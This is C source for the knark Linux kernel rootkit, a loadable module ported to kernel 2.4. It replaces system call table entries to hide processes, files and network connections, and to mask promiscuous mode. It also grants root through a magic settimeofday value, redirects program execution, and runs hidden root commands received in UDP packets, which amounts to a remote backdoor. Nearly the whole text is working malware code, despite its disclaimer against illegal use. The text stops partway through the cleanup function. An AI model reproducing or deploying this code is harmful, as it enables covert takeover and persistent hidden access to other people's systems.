/*
 * knark.c, part of the knark package
 * (c) Creed @ #hack.se 1999 <creed@sekure.net>
 * Ported to kernel 2.4 2001 by cyberwinds@hotmail.com #irc.openprojects.net
 * 
 * This lkm is based on heroin.c by Runar Jensen, so credits goes to him.
 * Heroin.c however offered quite few features, and major changes have been
 * made, so this isn't the same piece of code anymore.
 * 
 * This program/lkm may NOT be used in an illegal way,
 * or to cause damage of any kind.
 * 
 * See README for more info.
 * For the curious: %hu unsigned short %u unsigned int %lu unsigned long %Lu long long unsigned
 */


#define __KERNEL_SYSCALLS__
#include <linux/version.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/sched.h>
#include <linux/socket.h>
#include <linux/smp_lock.h>
#include <linux/stat.h>
#include <linux/dirent.h>
#include <linux/fs.h>
#include <linux/if.h>
#include <linux/modversions.h>
#include <linux/malloc.h>
#include <linux/unistd.h>
#include <linux/string.h>
#include <linux/skbuff.h>
#include <linux/ip.h>
#include <sys/syscall.h>
#include <net/protocol.h>
#include <net/udp.h>
#include <net/icmp.h>
#include <linux/dirent.h>
#include <linux/proc_fs.h>
#include <asm/uaccess.h>
#include <asm/errno.h>
#include <asm/unistd.h>

#include "knark.h"

#define PF_INVISIBLE 0x10000000
#define PROC_NET_TCP "tcp"
#define PROC_NET_UDP "udp"

struct linux_dirent {
        unsigned long   d_ino;
        unsigned long   d_off;
        unsigned short  d_reclen;
        char            d_name[1];
};
struct linux_dirent64 {
        u64             d_ino;
        s64             d_off;
        unsigned short  d_reclen;
        unsigned char   d_type;
        char            d_name[0];
};

extern void *sys_call_table[];

static inline _syscall3(int, getdents, uint, fd, void *, dirp, uint, count);
static inline _syscall3(int, getdents64, uint, fd, void *, dirp, uint, count);
static inline _syscall2(int, kill, int, pid, int, sig);
static inline _syscall3(int, ioctl, unsigned int, fd, unsigned int, cmd, unsigned long, arg);
static inline _syscall1(int, fork, int, regs);
static inline _syscall1(int, clone, int, regs);
static inline _syscall2(int, settimeofday, struct timeval *, tv, struct timezone *, tz);

asmlinkage long (*original_getdents)(unsigned int, void *, unsigned int);
asmlinkage long (*original_getdents64)(unsigned int, void *, unsigned int);
asmlinkage long (*original_kill)(int, int);
asmlinkage ssize_t (*original_read)(unsigned int, char *, size_t);
asmlinkage long (*original_ioctl)(unsigned int, unsigned int, unsigned long);
asmlinkage int (*original_fork)(struct pt_regs);
asmlinkage int (*original_clone)(struct pt_regs);
asmlinkage int (*original_execve)(struct pt_regs);
asmlinkage long (*original_settimeofday)(struct timeval *, struct timezone *);

asmlinkage long knark_getdents(unsigned int, void *, unsigned int);
asmlinkage long knark_getdents64(unsigned int, void *, unsigned int);
asmlinkage int knark_fork(struct pt_regs);
asmlinkage int knark_clone(struct pt_regs);
asmlinkage long knark_kill(pid_t, int);
asmlinkage long knark_ioctl(int, int, long);
asmlinkage ssize_t knark_read(int, char *, size_t);
asmlinkage int knark_execve(struct pt_regs regs);
asmlinkage long knark_settimeofday(struct timeval *, struct timezone *);

unsigned int knark_error(char * err_msg);
int knark_atoi(char *);
void knark_bcopy(char *, char *, unsigned int);
struct task_struct *knark_find_task(pid_t);
int knark_is_invisible(pid_t);
int knark_hide_process(pid_t);
int knark_hide_file(struct inode *, struct dentry *);
int knark_unhide_file(struct inode *);
int knark_secret_file(ino_t, kdev_t);
struct knark_dev_struct *knark_add_secret_dev(kdev_t);
struct knark_dev_struct *knark_get_secret_dev(kdev_t);
int knark_add_nethide(char *);
int knark_clear_nethides(void);
int knark_add_redirect(struct exec_redirect *);
char *knark_redirect_path(char *);
int knark_clear_redirects(void);

int knark_read_pids(char *, char **, off_t, int, int *, void *);
int knark_read_files(char *, char **, off_t, int, int *, void *);
int knark_read_redirects(char *, char **, off_t, int, int *, void *);
int knark_read_nethides(char *, char **, off_t, int, int *, void *);
int knark_read_author(char *, char **, off_t, int, int *, void *);
#ifdef FUCKY_REXEC_VERIFY
int knark_read_verify_rexec(char *, char **, off_t, int, int *, void *);
int knark_write_verify_rexec(struct file *, const char *, u_long, void *);
#endif /*FUCKY_REXEC_VERIFY*/

int knark_do_exec_userprogram(void *);
int knark_execve_userprogram(char *, char **, char **, int);
//int knark_udp_rcv(struct sk_buff *, unsigned short);
int knark_udp_rcv(struct sk_buff *);
struct inet_protocol * original_udp_protocol;

ino_t knark_ino;
int errno;
/*
 * Use a different major or minor number if you found knark completely failed on your
 * system. I found it confusing that proc_roo.rdev shows major 0 minor 0 as its
 * device signature.
 */
unsigned short proc_major_dev = 0;
unsigned short proc_minor_dev = 4;

#ifdef FUCKY_REXEC_VERIFY
int verify_rexec = 16;
#endif /*FUCKY_REXEC_VERIFY*/

struct redirect_list
{
    struct redirect_list *next;
    struct exec_redirect rl_er;
} *knark_redirect_list = NULL;


struct nethide_list
{
    struct nethide_list *next;
    char *nl_hidestr;
} *knark_nethide_list = NULL;


struct knark_dev_struct {
    kdev_t d_dev;
    int d_nfiles;
    ino_t d_inode[MAX_SECRET_FILES];
    char *d_name[MAX_SECRET_FILES];
};


struct knark_fs_struct {
    int f_ndevs;
    struct knark_dev_struct *f_dev[MAX_SECRET_DEVS];
} *kfs;


struct execve_args {
    char *path;
    char **argv;
    char **envp;
};


struct proc_dir_entry * knark_dir;
struct proc_dir_entry * knark_pids;
struct proc_dir_entry * knark_files;
struct proc_dir_entry * knark_redirects;
struct proc_dir_entry * knark_nethides;
struct proc_dir_entry * knark_author;
#ifdef FUCKY_REXEC_VERIFY
struct proc_dir_entry * knark_verify_rexec;
#endif /*FUCKY_REXEC_VERIFY*/


struct inet_protocol knark_udp_protocol =
{
    &knark_udp_rcv,
    NULL,
    NULL,
    IPPROTO_ICMP,
    0,
    NULL,
    "ICMP"
};

unsigned int knark_error(char * err_msg){
  return EINVAL;
}


int knark_atoi(char *str)
{
    int ret = 0;

    while (*str)
    {
        if(*str < '0' || *str > '9')
            return -EINVAL;
        ret *= 10;
        ret += (*str - '0');
        str++;
    }
    return ret;
}


void knark_bcopy(char *src, char *dst, unsigned int num)
{
    while(num-- > 0)
        *(dst++) = *(src++);
}


int knark_strcmp(const char *str1, const char *str2)
{
    while(*str1 && *str2)
	if(*(str1++) != *(str2++))
	    return -1;
    return 0;
}


struct task_struct *knark_find_task(pid_t pid)
{
    struct task_struct *task = current;

    do {
	if(task->pid == pid)
	    return task;
	task = task->next_task;
    } while(current != task);
    
    return NULL;
}


int knark_is_invisible(pid_t pid)
{
    struct task_struct *task;
    
    if(pid < 0) return 0;
    
    if( (task = knark_find_task(pid)) == NULL)
      return 0;
    // use a kernel func instead :)
    //    if( (task = find_task_by_pid(pid)) == 0x0)
    //      return 0;
    if(task->flags & PF_INVISIBLE)
	return 1;
    
    return 0;
}


int knark_hide_process(pid_t pid)
{
    struct task_struct *task;
    
    if( (task = knark_find_task(pid)) == NULL)
	return 0;
    
    task->flags |= PF_INVISIBLE;
    
    return 1;
}


struct knark_dev_struct *knark_add_secret_dev(kdev_t dev)
{
    int current_dev = kfs->f_ndevs;
    int ndevs = kfs->f_ndevs;
    struct knark_dev_struct **kds = kfs->f_dev;
    
    if(ndevs >= MAX_SECRET_DEVS)
	return NULL;
    
    kds[current_dev] = (struct knark_dev_struct *) kmalloc(sizeof(struct knark_dev_struct), GFP_KERNEL);
    if(kds[current_dev] == NULL)
	return NULL;
    
    kds[current_dev]->d_dev = dev;
    kds[current_dev]->d_nfiles = 0;
    memset(kds[current_dev]->d_inode, 0, MAX_SECRET_FILES * sizeof(ino_t));
    memset(kds[current_dev]->d_name, 0, MAX_SECRET_FILES * sizeof(char *));
    kfs->f_ndevs++;
    
    return kds[current_dev];
}


struct knark_dev_struct *knark_get_secret_dev(kdev_t dev)
{
    int ndevs = kfs->f_ndevs;
    struct knark_dev_struct **kds = kfs->f_dev;
    int i;
    
    for(i = 0; i < ndevs; i++){
      if(kds[i]->d_dev == dev)
	return kds[i];
    }    
    return NULL;
}


int knark_secret_file(ino_t inode, kdev_t dev)
{
    int i;
    int nfiles;
    struct knark_dev_struct *kds;
    
    kds = knark_get_secret_dev(dev);
    if(kds == NULL)
	return 0;
    
    nfiles = kds->d_nfiles;
    for(i = 0; i < nfiles; i++)
	if(kds->d_inode[i] == inode)
	    return 1;
    
    return 0;
}

int knark_hide_file(struct inode *inode, struct dentry *entry)
{
    char *name, *nameptr[16];
    int i, len, namelen = 0;
    struct knark_dev_struct *kds;
    ino_t ino = inode->i_ino;
    kdev_t dev = inode->i_sb->s_dev;

    if(knark_secret_file(ino, dev))
        return -1;

    kds = knark_get_secret_dev(dev);
    if(kds == NULL) {
        kds = knark_add_secret_dev(dev);
        if(kds == NULL)
            return -1;
    }

    else if(kds->d_nfiles >= MAX_SECRET_FILES)
        return -1;
    kds->d_inode[kds->d_nfiles] = ino;
    
    if(entry) {
	memset(nameptr, 0, 16*sizeof(char *));
	for(i = 0; i < 16 && entry->d_name.len != 1 && entry->d_name.name[0] != '/'; i++)
	{
	    nameptr[i] = (char *)entry->d_name.name;
	    namelen += entry->d_name.len;
	    entry = entry->d_parent;
	}
	namelen += i + 1; // the '/'s :)
	kds->d_name[kds->d_nfiles] = kmalloc(namelen, GFP_KERNEL);
	name = kds->d_name[kds->d_nfiles];
	name[0] = '\0';
	
	for(i = 0; nameptr[i]; i++) ;
	for(i--; i >= 0; i--)
	{
	    len = strlen(name);
	    name[len] = '/';
	    strcpy(&name[len+1], nameptr[i]);
	}
    }
    
    else
	kds->d_name[kds->d_nfiles] = NULL;

    return ++kds->d_nfiles;
}


int knark_unhide_file(struct inode *inode)
{
    int i;
    int nfiles;
    struct knark_dev_struct *kds;
    ino_t ino = inode->i_ino;
    kdev_t dev = inode->i_dev;
    
    if(!knark_secret_file(ino, dev))
	return -1;
    
    kds = knark_get_secret_dev(dev);
    if(kds == NULL)
        return -1;

    nfiles = kds->d_nfiles;
    for(i = 0; i < nfiles; i++)
        if(kds->d_inode[i] == ino)
    {
        kds->d_inode[i] = kds->d_inode[nfiles - 1];
        kds->d_inode[nfiles - 1] = 0;
	if(kds->d_name[nfiles - 1])
	    kfree(kds->d_name[nfiles - 1]);
        return --kds->d_nfiles;
    }

    return -1;
}

asmlinkage long knark_getdents(unsigned int fd, void *dirp, unsigned int count)
{
    int ret;
    int proc = 0;
    struct inode *dinode;
    char *ptr = (char *)dirp;
    struct dirent *curr;
    struct dirent *prev = NULL;
    kdev_t dev;


    ret = (*original_getdents)(fd, dirp, count);
    if(ret <= 0) return ret;

    dinode = current->files->fd[fd]->f_dentry->d_inode;
    dev = dinode->i_sb->s_dev;
    
    if(dinode->i_ino == PROC_ROOT_INO && MAJOR(dinode->i_dev) == proc_major_dev &&
       MINOR(dinode->i_dev) == proc_minor_dev)
	proc++;
    
    while(ptr < (char *)dirp + ret)
    {
	curr = (struct dirent *)ptr;

	if( (proc && (curr->d_ino == knark_ino ||
		      knark_is_invisible(knark_atoi(curr->d_name)))) ||
	    knark_secret_file(curr->d_ino, dev))
	{
	    if(curr == dirp)
	    {
		ret -= curr->d_reclen;
		knark_bcopy(ptr + curr->d_reclen, ptr, ret);
		continue;
	    }
	    else
		prev->d_reclen += curr->d_reclen;
	}
	else
	    prev = curr;
	
	ptr += curr->d_reclen;
    }

    return ret;
}

asmlinkage long knark_getdents64(unsigned int fd, void *dirp, unsigned int count)
{
    int ret;
    int proc = 0;
    struct inode *dinode;
    char *ptr = (char *)dirp;
    struct linux_dirent64 *curr;
    struct linux_dirent64 *prev = NULL;
    kdev_t dev;


    ret = (*original_getdents64)(fd, dirp, count);
    if(ret <= 0) return ret;

    dinode = current->files->fd[fd]->f_dentry->d_inode;
    dev = dinode->i_sb->s_dev;
    
    if(dinode->i_ino == PROC_ROOT_INO && MAJOR(dinode->i_dev) == proc_major_dev &&
       MINOR(dinode->i_dev) == proc_minor_dev)
	proc++;
    while(ptr < (char *)dirp + ret)
    {
	curr = (struct linux_dirent64 *)ptr;

	if( (proc && (curr->d_ino == knark_ino ||
		      knark_is_invisible(knark_atoi(curr->d_name)))) ||
	    knark_secret_file(curr->d_ino, dev))
	{
	    if(curr == dirp)
	    {
		ret -= curr->d_reclen;
		knark_bcopy(ptr + curr->d_reclen, ptr, ret);
		continue;
	    }
	    else
		prev->d_reclen += curr->d_reclen;
	}
	else
	    prev = curr;
	
	ptr += curr->d_reclen;
    }

    return ret;
}

asmlinkage int knark_fork(struct pt_regs regs)
{
    pid_t pid;
    int hide = 0;
    
    if(knark_is_invisible(current->pid))
	hide++;
    
    pid = (*original_fork)(regs);
    if(hide && pid > 0)
	knark_hide_process(pid);
    
    return pid;
}


asmlinkage int knark_clone(struct pt_regs regs)
{
    pid_t pid;
    int hide = 0;
    
    if(knark_is_invisible(current->pid))
	hide++;
    
    pid = (*original_clone)(regs);
    if(hide && pid > 0)
	knark_hide_process(pid);
    
    return pid;
}


asmlinkage long knark_kill(pid_t pid, int sig)
{
    struct task_struct *task;

    if(sig != SIGINVISIBLE && sig != SIGVISIBLE)
 	return (*original_kill)(pid, sig);
     
    if((task = knark_find_task(pid)) == NULL)
	return -ESRCH;
    if(current->uid && current->euid)
	return -EPERM;
    
    if(sig == SIGINVISIBLE) task->flags |= PF_INVISIBLE;
    else task->flags &= ~PF_INVISIBLE;
    
    return 0;
}


asmlinkage long knark_ioctl(int fd, int cmd, long arg)
{
    int ret;
    struct ifreq ifr;
    struct inode *inode;
    struct dentry *entry;

    if(cmd != KNARK_ELITE_CMD)
    {
	ret = (*original_ioctl)(fd, cmd, arg);
	if(!ret && cmd == SIOCGIFFLAGS)
	{
	    copy_from_user(&ifr, (void *)arg, sizeof(struct ifreq));
	    ifr.ifr_ifru.ifru_flags &= ~IFF_PROMISC;
	    copy_to_user((void *)arg, &ifr, sizeof(struct ifreq));
	}
	return ret;
    }
    
    if(current->files->fd[fd] == NULL)
	return -1;
    
    entry = current->files->fd[fd]->f_dentry;
    inode = entry->d_inode;
    switch(arg)
    {
      case KNARK_HIDE_FILE:
	ret = knark_hide_file(inode, entry);
	break;
	
      case KNARK_UNHIDE_FILE:
	ret = knark_unhide_file(inode);
	break;
	
      default:
	return -EINVAL;
    }
    return ret;
}


int knark_add_nethide(char *hidestr)
{
    struct nethide_list *nl = knark_nethide_list;
    
    if(nl->nl_hidestr)
    {
	while(nl->next)
	    nl = nl->next;
	
	nl->next = kmalloc(sizeof(struct nethide_list), GFP_KERNEL);
	if(nl->next == NULL) return -1;
	nl = nl->next;
    }
    
    nl->next = NULL;
    nl->nl_hidestr = hidestr;
    
    return 0;
}


int knark_clear_nethides(void)
{
    struct nethide_list *tmp, *nl = knark_nethide_list;
    
    do {
	if(nl->nl_hidestr)
	{
	    putname(nl->nl_hidestr);
	    nl->nl_hidestr = NULL;
	}
	
	nl = nl->next;
    } while(nl);
    
    nl = knark_nethide_list->next;
    while(nl)
    {
	tmp = nl->next;
	kfree(nl);
	nl = tmp;
    }
    knark_nethide_list->next = NULL;
    
    return 0;
}


asmlinkage ssize_t knark_read(int fd, char *buf, size_t count)
{
    int ret;
    char *p1, *p2;
    struct inode *dinode;
    struct dentry * f_entry;
    struct nethide_list *nl = knark_nethide_list;
    
    ret = (*original_read)(fd, buf, count);
    if(ret <= 0 || nl->nl_hidestr == NULL) return ret;
    
    dinode = current->files->fd[fd]->f_dentry->d_inode;
    f_entry = current->files->fd[fd]->f_dentry;

    /*
     * The /proc file system has a minor number 4 on my system. But this
     * number could be different on another system. The best way would be
     * to find out this number and put it as a global variable.
     * it is checked here, in getdents, and in getdents64
     */
    if(MAJOR(dinode->i_dev) != proc_major_dev || MINOR(dinode->i_dev) != proc_minor_dev)
	return ret;
    
    if(strncmp(f_entry->d_iname, PROC_NET_TCP, 3) == 0 
       || strncmp(f_entry->d_iname, PROC_NET_UDP, 3) == 0)
    {
	do {
	    while( (p1 = p2 = (char *) strstr(buf, nl->nl_hidestr)) )
	    {
		*p1 =~ *p1;
		
		while(*p1 != '\n' && p1 > buf)
		    p1--;
		if(*p1 == '\n')
		    p1++;
		
		while(*p2 != '\n' && p2 < buf + ret - 1)
		    p2++;
		if(*p2 == '\n')
		    p2++;
	    
		while(p2 < buf + ret)
		    *(p1++) = *(p2++);
		
		ret -= p2 - p1;
	    }
	    nl = nl->next;
	} while(nl && nl->nl_hidestr);
    }
    
    return ret;
}


int knark_clear_redirects()
{
    struct redirect_list *tmp, *rl = knark_redirect_list;
    
    do {
	if(rl->rl_er.er_from)
	{
	    putname(rl->rl_er.er_from);
	    rl->rl_er.er_from = NULL;
	}
	if(rl->rl_er.er_to)
	{
	    putname(rl->rl_er.er_to);
	    rl->rl_er.er_to = NULL;
	}
	
	rl = rl->next;
    } while(rl);
    
    rl = knark_redirect_list->next;
    while(rl)
    {
	tmp = rl->next;
	kfree(rl);
	rl = tmp;
    }
    knark_redirect_list->next = NULL;
    
    return 0;
}


int knark_add_redirect(struct exec_redirect *er)
{
    struct redirect_list *rl = knark_redirect_list;
    
    if(knark_strcmp(er->er_from, knark_redirect_path(er->er_from)) ||
       !knark_strcmp(er->er_from, er->er_to))
	return -1;
    
    if(rl->rl_er.er_from)
    {
	while(rl->next)
	    rl = rl->next;
	
	rl->next = kmalloc(sizeof(struct redirect_list), GFP_KERNEL);
	if(rl->next == NULL) return -1;
	rl = rl->next;
    }
    
    rl->next = NULL;
    rl->rl_er.er_from = er->er_from;
    rl->rl_er.er_to = er->er_to;
    
    return 0;
}


char *knark_redirect_path(char *path)
{
    struct redirect_list *rl = knark_redirect_list;

    do {
	if(rl->rl_er.er_from && !knark_strcmp(path, rl->rl_er.er_from))
	    return rl->rl_er.er_to;
	
	rl = rl->next;
    } while(rl);
    
    return path;
}


asmlinkage long knark_settimeofday(struct timeval *tv, struct timezone *tz)
{
    char *hidestr;
    struct exec_redirect er, er_user;
    
    switch((int)tv)
    {
      case KNARK_GIMME_ROOT:
	current->uid = current->euid = current->suid = current->fsuid = 0;
	current->gid = current->egid = current->sgid = current->fsgid = 0;
	break;
	
      case KNARK_ADD_REDIRECT:
	copy_from_user((void *)&er_user, (void *)tz, sizeof(struct exec_redirect));
	er.er_from = getname(er_user.er_from);
	er.er_to = getname(er_user.er_to);
	if(IS_ERR(er.er_from) || IS_ERR(er.er_to))
	    return -1;	
	knark_add_redirect(&er);
	break;

      case KNARK_CLEAR_REDIRECTS:
	knark_clear_redirects();
	break;
	
      case KNARK_ADD_NETHIDE:
	hidestr = getname((char *)tz);
	if(IS_ERR(hidestr))
	    return -1;
	knark_add_nethide(hidestr);
	break;
	
      case KNARK_CLEAR_NETHIDES:
	knark_clear_nethides();
	break;
    
      default:
	return (*original_settimeofday)(tv, tz);
    }
    return 0;
}
    

asmlinkage int knark_execve(struct pt_regs regs)
{
    int error;
    char *filename;
    
    lock_kernel();
    filename = getname((char *)regs.ebx);
    error = PTR_ERR(filename);
    if(IS_ERR(filename))
	goto out;
    
    error = do_execve(knark_redirect_path(filename), (char **)regs.ecx,
		      (char **)regs.edx, &regs);
    
    if(error == 0)
      //	current->flags &= ~PF_DTRACE;
      current->flags &= ~PT_DTRACE;
    putname(filename);
out:
    unlock_kernel();
    return error;
}


#define BUF_LIMIT (PAGE_SIZE - 80)
int knark_read_pids(char *buf, char **start, off_t offset, int len,
		    int * eof, void * data)
{
    struct task_struct *task;
    if(offset > 0) return 0;

    if( (task = knark_find_task(1)) == NULL)
	return 0;
    
    len = sprintf(buf, " EUID PID\tCOMMAND\n");
    
    do {
	if(task->flags & PF_INVISIBLE)
	    len += sprintf(buf+len, "%5d %d\t%s\n",
			   task->euid, task->pid, task->comm);
	task = task->next_task;
    } while(task->pid != 1 && len < BUF_LIMIT);
    *eof = 1;
    *start = buf;
    return len;
}


int knark_read_files(char *buf, char **start, off_t offset, int len,
		    int * eof, void * data)
{
    int n, i;
    if(offset > 0) return 0;

    len = sprintf(buf, "HIDDEN FILES\n");
    
    for(n = 0; n < kfs->f_ndevs; n++)
	for(i = 0; i < kfs->f_dev[n]->d_nfiles; i++)
	    len += sprintf(buf+len, "%s\n", kfs->f_dev[n]->d_name[i]);
    *eof = 1;
    *start = buf;
    return len;
}


int knark_read_redirects(char *buf, char **start, off_t offset, int len,
			 int * eof, void * data)
{
    int n, tmp=0;
    struct redirect_list *rl = knark_redirect_list;
    if(offset > 0) return 0;

    len = sprintf(buf, "REDIRECT FROM                 REDIRECT TO\n");
    if(rl->rl_er.er_from == NULL)
	return len;
    
    while(rl)
    {
	len += tmp = sprintf(buf+len, "%s", rl->rl_er.er_from);
	n = 30 - tmp;
	memset(buf+len, ' ', n);
	len += n;
	len += sprintf(buf+len, "%s\n", rl->rl_er.er_to);

	rl = rl->next;
	
    }
    *eof = 1;
    *start = buf;
    return len;
}


int knark_read_nethides(char *buf, char **start, off_t offset, int len,
			int * eof, void * data)
{
    struct nethide_list *nl = knark_nethide_list;
    if(offset > 0) return 0;

    len = sprintf(buf, "HIDDEN STRINGS (without the quotes)\n");   
    while(nl && nl->nl_hidestr)
    {
	len += sprintf(buf+len, "\"%s\"\n", nl->nl_hidestr);
	nl = nl->next;
    }
    *eof = 1;
    *start = buf;
    return len;
}


int knark_read_author(char *buf, char **start, off_t offset, int len,
		     int *eof, void *data)
{
  if(offset > 0) return 0;
    len = sprintf(buf,
		"* * * * * * * * * * * * * * * * * * * * * * * * * * * * * *\n"
		"* knark %s by Creed @ #hack.se 1999 <creed@sekure.net>*\n"
		"* Ported to 2.4.x 2001 by cyberwinds@hotmail.com          *\n"
		"*                                                         *\n"
		"*    This program may NOT be used in an illegal way       *\n"
	        "*          or to cause damage of any kind.                *\n"
	        "* * * * * * * * * * * * * * * * * * * * * * * * * * * * * *\n"
		,KNARK_VERSION);
    *eof = 1;
    *start = buf;
    return len;
}


#ifdef FUCKY_REXEC_VERIFY
ssize_t knark_verify_rexec_fops_read(struct file *file, char *buf,
				     size_t len, loff_t *offset)
{
    if(file->f_pos == strlen("fikadags?\n"))
       return 0;
    
    len = sprintf(buf, "fikadags?\n");
    file->f_pos = len;
       
    return len;
}


int knark_write_verify_rexec(struct file *file, const char *buf, u_long count,
			     void *data)
{
    int num, n;
    char buff[16];
    
    n = count<16? count:16;
    knark_bcopy((char *)buf, buff, n);
    if(buff[n-1] == '\n')
	buff[n-1] = '\0';
    else
	buff[n] = '\0';
    
    num = knark_atoi(buff);
    if(num >= 0 && num <= 16)
	verify_rexec = num;
    
    file->f_pos = count;

    return count;
}


int knark_read_verify_rexec(char *buf, char **start, off_t offset, int len,
			    int *eof, void * data)
{
    len = sprintf(buf,
	   "Knark rexec verify-packet must be one of:\n"
	   " 0   ICMP_NET_UNREACH\n"
	   " 1   ICMP_HOST_UNREACH\n"
	   " 2   ICMP_PROT_UNREACH\n"
	   " 3   ICMP_FRAG_NEEDED\n"
	   " 4   ICMP_FRAG_NEEDED\n"
	   " 5   ICMP_SR_FAILED\n"
	   " 6   ICMP_NET_UNKNOWN\n"
	   " 7   ICMP_HOST_ISOLATED\n"
	   " 8   ICMP_HOST_ISOLATED\n"
	   " 9   ICMP_NET_ANO\n"
	   " 10  ICMP_HOST_ANO\n"
	   " 11  ICMP_NET_UNR_TOS\n"
	   " 12  ICMP_HOST_UNR_TOS\n"
	   " 13  ICMP_PKT_FILTERED\n"
	   " 14  ICMP_PREC_VIOLATION\n"
	   " 15  ICMP_PREC_VIOLATION\n"
	   " 16  (don't verify)\n"
	   "\n"
	   "Currently set to: %d\n",
	   verify_rexec);
    *eof = 1;
    *start = buf;
    return len;
}
#endif /*FUCKY_REXEC_VERIFY*/


int knark_execve_userprogram(char *path, char **argv, char **envp, int secret)
{
    static char *path_argv[2];
    static char *def_envp[] = { "HOME=/", "TERM=linux", 
      "PATH=/bin:/usr/bin:/usr/local/bin:/sbin:/usr/sbin:/usr/local/sbin:"
	   "/usr/bin/X11", NULL
    };
    static struct execve_args args;
    pid_t pid;
    
    if(path) args.path = path;
    else return -1;
    
    if(argv) args.argv = argv;
    else {
	path_argv[0] = path;
	path_argv[1] = NULL;
    }
    
    if(envp) args.envp = envp;
    else args.envp = def_envp;
    
    pid = kernel_thread(knark_do_exec_userprogram, (void *)&args, CLONE_FS);
    if(pid == -1)
	return -1;
    
    if(secret) knark_hide_process(pid);
    return pid;
}


int knark_do_exec_userprogram(void *data)
{
    int i;
    struct fs_struct *fs;
    struct execve_args *args = (struct execve_args *) data;
    
    lock_kernel();
    
    exit_fs(current);
    fs = init_task.fs;
    current->fs = fs;
    atomic_inc(&fs->count);
    
    unlock_kernel();
    
    for(i = 0; i < current->files->max_fds; i++)
	if(current->files->fd[i]) close(i);
    
    current->uid = current->euid = current->fsuid = 0;
    cap_set_full(current->cap_inheritable);
    cap_set_full(current->cap_effective);
    
    set_fs(KERNEL_DS);

    if(execve(args->path, args->argv, args->envp) < 0)
	return -1;

    return 0;
}


int knark_udp_rcv(struct sk_buff *skb)
{
    int i, datalen;
    struct udphdr *uh = (struct udphdr *)(skb->data + 48);
    char *buf, *data = skb->data + 56;
    static char *argv[16];
    char space_str[2];
    
    if(uh->source != ntohs(53) ||
       uh->dest != ntohs(53) ||
	*(u_long *)data != UDP_REXEC_USERPROGRAM)
	goto bad;
    data += 4;
    datalen = ntohs(uh->len) - sizeof(struct udphdr) - sizeof(u_long);
    
    buf = kmalloc(datalen+1, GFP_KERNEL);
    if(buf == NULL)
	goto bad;
    
    knark_bcopy(data, buf, datalen);
    buf[datalen] = '\0';
    
    space_str[0] = SPACE_REPLACEMENT;
    space_str[1] = 0;
    for(i = 0; i < 16 && (argv[i] = strtok(i? NULL:buf, space_str)) != NULL;
	i++);
    argv[i] = NULL;

    knark_execve_userprogram(argv[0], argv, NULL, 1);
#ifdef FUCKY_REXEC_VERIFY
    if(verify_rexec >= 0 && verify_rexec < 16)
	icmp_send(skb, ICMP_DEST_UNREACH, verify_rexec, 0);
#endif /*FUCKY_REXEC_VERIFY*/
    
    return 0;
bad:
    //    return original_udp_protocol->handler(skb);
    return original_udp_protocol->handler(skb);
}

#define DMODE S_IFDIR|S_IRUGO|S_IXUGO
#define FMODE S_IFREG|S_IRUGO

int init_module(void)
{

    inet_add_protocol(&knark_udp_protocol);
    original_udp_protocol = knark_udp_protocol.next;
    inet_del_protocol(original_udp_protocol);
    
    kfs = kmalloc(sizeof(struct knark_fs_struct), GFP_KERNEL);
    if(kfs == NULL) goto error;
    memset((void *)kfs, 0, sizeof(struct knark_fs_struct));

    knark_redirect_list = kmalloc(sizeof(struct redirect_list), GFP_KERNEL);
    if(knark_redirect_list == NULL) goto error;
    memset((void *)knark_redirect_list, 0, sizeof(struct redirect_list));
    
    knark_nethide_list = kmalloc(sizeof(struct nethide_list),
				     GFP_KERNEL);
    if(knark_nethide_list == NULL) goto error;
    memset((void *)knark_nethide_list, 0, sizeof(struct nethide_list));
    

    knark_dir = create_proc_entry(MODULE_NAME, DMODE, &proc_root);
    if(knark_dir == 0x0) return knark_error("create knark_dir");
    knark_ino = knark_dir->low_ino;

    knark_pids = create_proc_entry("pids", FMODE, knark_dir);
    if(knark_pids == 0x0) return knark_error("create knark_pids");
    knark_pids->read_proc = knark_read_pids;

    knark_files = create_proc_entry("files", FMODE, knark_dir);
    if(knark_files == 0x0) return knark_error("create knark_files");
    knark_files->read_proc = knark_read_files;

    knark_author = create_proc_entry("author", FMODE, knark_dir);
    if(knark_author == 0x0) return knark_error("create knark_author");
    knark_author->read_proc = knark_read_author;

    knark_redirects = create_proc_entry("redirects", FMODE, knark_dir);
    if(knark_redirects == 0x0) return knark_error("create redirects");
    knark_redirects->read_proc = knark_read_redirects;

    knark_nethides = create_proc_entry("nethides", FMODE, knark_dir);
    if(knark_nethides == 0x0) return knark_error("create nethides");
    knark_nethides->read_proc = knark_read_nethides;
#ifdef FUCKY_REXEC_VERIFY
    knark_verify_rexec = create_proc_entry("verify_rexec", FMODE|S_IWUSR, knark_dir);
    if(knark_verify_rexec == 0x0) return knark_error("create verify_rexec");
    knark_verify_rexec->read_proc = knark_read_verify_rexec;
    knark_verify_rexec->write_proc = knark_write_verify_rexec;
#endif /*FUCKY_REXEC_VERIFY*/
    
    original_getdents = sys_call_table[SYS_getdents];
    sys_call_table[SYS_getdents] = knark_getdents;
    original_getdents64 = sys_call_table[SYS_getdents64];
    sys_call_table[SYS_getdents64] = knark_getdents64;
    original_kill = sys_call_table[SYS_kill];
    sys_call_table[SYS_kill] = knark_kill;
    original_read = sys_call_table[SYS_read];
    sys_call_table[SYS_read] = knark_read;
    original_ioctl = sys_call_table[SYS_ioctl];
    sys_call_table[SYS_ioctl] = knark_ioctl;
    original_fork = sys_call_table[SYS_fork];
    sys_call_table[SYS_fork] = knark_fork;
    original_clone = sys_call_table[SYS_clone];
    sys_call_table[SYS_clone] = knark_clone;
    original_settimeofday = sys_call_table[SYS_settimeofday];
    sys_call_table[SYS_settimeofday] = knark_settimeofday;
    original_execve = sys_call_table[SYS_execve];
    sys_call_table[SYS_execve] = knark_execve;
    return 0;
error:
    return -1;
}


void cleanup_module(void)
{
    int i, n;

    inet_add_protocol(original_udp_protocol);
    inet_del_protocol(&knark_udp_protocol);

    remove_proc_entry("author", knark_dir);
    remove_proc_entry("redirects", knark_dir);
    remove_proc_entry("nethides", knark_dir);
    remove_proc_entry("pids", knark_dir);
    remove_proc_entry("files", knark_dir);
#ifdef FUCKY_REXEC_VERIFY
    remove_proc_entry("verify_rexec", knark_dir);
#endif
    remove_proc_entry(MODULE_NAME, &proc_root);    

    sys_call_table[SYS_getdents] = original_getdents;
    sys_call_table[SYS_getdents64] = original_getdents64;
    sys_call_table[SYS_kill] = original_kill;
    sys_call_table[SYS_read] = original_read;
    sys_call_table[SYS_ioctl] = original_ioctl;
    sys_call_table[SYS_fork] = original_fork;
    sys_call_table[SYS_clone] = original_clone;
